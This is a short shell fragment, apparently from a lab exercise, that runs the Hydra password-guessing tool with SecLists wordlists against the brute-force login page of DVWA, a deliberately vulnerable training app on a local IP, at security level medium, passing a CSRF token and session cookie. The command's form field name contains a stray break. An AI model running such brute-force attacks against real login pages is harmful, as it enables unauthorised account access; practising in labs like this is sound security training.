...
rm hydra.restore
hydra -L /Users/NTAuthority/Desktop/SecLists/Usernames/top_shortlist.txt  -P /Users/NTAuthority/Desktop/SecLists/Passwords/500-worst-passwords.txt -t 1 -d -u -F -w 10 -W 1 -V 192.168.178.98 http-post-form "/dvwa/vulnerabilities/brute/:username=^USER^&p     assword=^PASS^&Login=Login&user_token=${CSRFMED}:F=Content-Length\: 4945:H=Cookie\: security=medium; PHPSESSID=${SESSIONIDMED}"
